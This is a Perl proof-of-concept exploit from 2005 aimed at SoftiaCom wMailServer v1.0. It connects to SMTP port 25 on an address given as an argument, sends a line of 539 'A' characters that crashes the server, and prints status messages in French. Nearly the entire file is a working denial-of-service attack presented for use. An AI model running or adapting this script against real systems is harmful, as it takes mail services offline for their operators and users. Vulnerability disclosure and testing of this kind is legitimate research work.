#!/usr/bin/perl
# -----------------------------------------------------
# Vulnerability: Denial Of Service - Crash
# Discovered on: July 9, 2005
# Coded by: fRoGGz - SecuBox Labs
# Severity: Normal
-----------------------------------------------------

$boulet = $ARGV[0];

use IO::Socket;
print "\n\nSoftiaCom Software - wMailServer v1.0\r\n";
print "Denial Of Service - Crash Vulnerability\r\n";
print "---------------------------------------------\r\n";
print "Discovered & coded by fRoGGz - SecuBox Labs\r\n\n";
if(!$ARGV[0]) {
die "Utilisation: ./wms_poc.pl <ip>\n";
}

print "[ ] Connexion sur $boulet\n";
my($suckette) = "";
if ($suckette = IO::Socket::INET->new(PeerAddr => $boulet,PeerPort => "25",Proto => "TCP"))
{
print $suckette " " . "\x41" x 539 . "\r\n";
print "[ ] Emission du paquet malicieux ...\n";
sleep 2;
close $suckette;
print "[ ] Mission termin?e !\n\n";
}
else
{
print "[-] Impossible de se connecter sur $boulet\n";
}

